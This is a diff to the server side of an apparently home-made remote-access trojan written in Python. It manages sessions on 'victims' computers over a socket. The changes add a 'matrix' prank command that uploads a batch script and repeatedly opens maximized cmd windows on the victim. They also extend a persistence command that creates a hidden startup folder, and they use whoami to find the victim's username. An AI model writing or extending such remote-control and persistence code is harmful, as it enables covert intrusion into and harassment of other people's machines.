@@ -10,7 +10,7 @@ PORT = 420
 # -------------don't change anything from here if you don't know what you are doing-------------
 BUFFER = 1024
 ADDR = (HOST, PORT)
-FORMAT = "utf-8"
+FORMAT = "cp850"
 DISCONNECT = "!dsc"
 
 server = s.socket(s.AF_INET, s.SOCK_STREAM)
@@ -20,20 +20,24 @@ sessions = {}
 session_ids = []
 
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix"]
 
 
 class Commands:
     def __init__(self):
         self.helpmsg = """
+        All sessions scripts with a "(p)" at the end need the shell to be installed the ones with the "(t)" can be used without installation
         menu Commands:
         help: shows this message
         back: gets deselects the session and gets you back to them main menu
         sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
         
-        session Commands:
-        tree: Shows the entire dirrectorystructure of the 'C:\\' drive
-        install: Makes the shell persistent(starts with the victims computer)
+        session Commands|:
+        misc:
+            tree: Shows the entire dirrectorystructure of the 'C:\\' drive
+            install: Makes the shell persistent(starts with the victims computer)
+        troll:
+            matrix: [{number} how many times a cmd window will open] opens a big cmd window with random numbers generating(t)
         """
 
     # commands in the main menu
@@ -89,6 +93,7 @@ class Commands:
 
     # for commands if a session is sellected
     def session(self, name, conn, addr, message, decId, args=None):
+
         # delets the session and all its inforamtion
         def delete(decId):
             pass
@@ -96,9 +101,9 @@ class Commands:
         # reveives the messages and passes them to the evaluation
         def receiveMessage():
             msg_length = conn.recv(BUFFER).decode(FORMAT)
-            msg_length = int(msg_length)
 
             if msg_length:
+                msg_length = int(msg_length)
                 msg = conn.recv(msg_length).decode(FORMAT)
                 return msg
 
@@ -110,8 +115,11 @@ class Commands:
             conn.send(message_length)
 
             conn.send(msg.encode(FORMAT))
-            returned = receiveMessage()
-            print(returned)
+            if msg[2] == "o":
+                returned = receiveMessage()
+                return returned
+            else:
+                return
 
         # gets you back to the main menu
         if message == "back":
@@ -120,14 +128,44 @@ class Commands:
         # prints the help message
         elif message == "help":
             print(self.helpmsg)
+            return
 
         # shows the entire dir tree
         elif message == "tree":
-            sendMessage("c tree C:\\")
+            print(sendMessage("c o tree C:\\"))
 
         # installs the shell persistently
         elif message == "install":
-            sendMessage("c mkdir C:\\$SysStartup && cd C:\\ && attrib +h C:\\$SysStartup /d")
+            sendMessage("c n mkdir C:\\$SysStartup && cd C:\\ && attrib +h C:\\$SysStartup /d && mkdir C:\\$SysStartup\\temp")
+
+        # is a small bat script which makes random number appear in a cmd screen
+        elif message == "matrix":
+            if args:
+                try:
+                    arg = int(args[0])
+                except ValueError:
+                    print("The argument needs to be a number")
+                    return
+                # gets the username of the computer
+                pcAndUsername = sendMessage("c o whoami")
+                pcAndUsernameLst = pcAndUsername.replace("\r\n", "").split("\\")
+                username = pcAndUsernameLst[1]
+
+                with open("extraScripts/matrix.bat", "r") as file:
+                    sendMessage(file.read())
+                name = receiveMessage()
+
+                for i in range(int(args[0])):
+                    sendMessage(f"c n start /max cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
+                    sleep(0.5)
+
+                return
+            elif not args:
+                print("you need an argument type help for more")
+                return
+            else:
+                print("Those are too many arguments only one is allowed")
+                return
 
 
 # gets the commands whenn session is sellected
@@ -157,7 +195,7 @@ def sessionInput(conn, addr, name, decId):
 
         else:
             sessionInput(conn, addr, name, decId)
-    except ConnectionResetError:
+    except ConnectionResetError or ConnectionAbortedError:
         sessions.pop(decId)
         session_ids.pop(decId)
         print("The client is no longer connected")
